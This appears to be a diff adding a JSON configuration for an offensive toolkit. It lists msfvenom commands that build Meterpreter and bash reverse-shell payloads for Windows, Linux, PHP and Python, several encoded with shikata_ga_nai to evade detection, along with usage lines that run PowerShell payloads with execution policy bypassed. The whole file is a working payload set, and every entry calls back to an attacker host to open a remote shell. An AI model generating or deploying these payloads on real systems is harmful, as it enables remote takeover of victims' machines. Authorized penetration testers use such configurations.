@@ -1,0 +1,99 @@
+[
+    {
+        "platform": "windows",
+        "port": 6001,
+        "stageencoder": "x86/fnstenv_mov",
+        "payloads": [
+            {
+                "name": "shellcode_x86",
+                "generate": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f raw > shellcode_x86.bin"
+            },
+            {
+                "name": "exe_x86",
+                "generate": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe > payload_x86.exe"
+            },
+            {
+                "name": "vbs_x86",
+                "generate": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f vbs > payload_x86.vbs",
+                "usage": "START cscript.exe payload_x86.vbs"
+            }
+        ]
+    },
+    {
+        "platform": "windows",
+        "port": "6002",
+        "stageencoder": "x86/fnstenv_mov",
+        "payloads": [
+            {
+                "name": "powershell_x86",
+                "generate": "msfvenom -p windows/meterpreter/reverse_http LHOST=<host> LPORT=<port> -f psh > payload_x86.ps1",
+                "usage": "c:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoExit -File payload_x86.ps1"
+            }
+        ]
+    },
+    {
+        "platform": "windows",
+        "port": 6003,
+        "stageencoder": "x64/xor",
+        "payloads": [
+            {
+                "name": "powershell_x64",
+                "generate": "msfvenom -p windows/x64/meterpreter/reverse_http LHOST=<host> LPORT=<port> -f psh > payload_x64.ps1",
+                "usage": "powershell -ExecutionPolicy Bypass -NoExit -File payload_x64.ps1"
+            }
+        ]
+    },
+    {
+        "platform": "linux",
+        "port": 6004,
+        "stageencoder": "x86/fnstenv_mov",
+        "payloads": [
+            {
+                "name": "elf_x86",
+                "generate": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f elf > payload_x86.elf"
+            }
+        ]
+    },
+    {
+        "platform": "linux",
+        "port": 6005,
+        "payloads": [
+            {
+                "name": "bash",
+                "generate": "msfvenom -p cmd/unix/reverse_bash LHOST=<host> LPORT=<port> -f raw > payload.sh",
+                "usage": "sh/bash payload.sh"
+            }
+        ]
+    },
+    {
+        "platform": "linux",
+        "port": 6006,
+        "stageencoder": "x64/xor",
+        "payloads": [
+            {
+                "name": "elf_x64",
+                "generate": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f elf>payload_x64.elf"
+            }
+        ]
+    },
+    {
+        "platform": "php",
+        "port": 6007,
+        "payloads": [
+            {
+                "name": "php",
+                "generate": "msfvenom -p php/meterpreter_reverse_tcp LHOST=<host> LPORT=<port> -f raw > payload.php"
+            }
+        ]
+    },
+    {
+        "platform": "python",
+        "port": 6008,
+        "payloads": [
+            {
+                "name": "python",
+                "generate": "msfvenom -p python/meterpreter_reverse_tcp LHOST=<host> LPORT=<port> -f raw > payload.py"
+            }
+        ]
+    }
+]
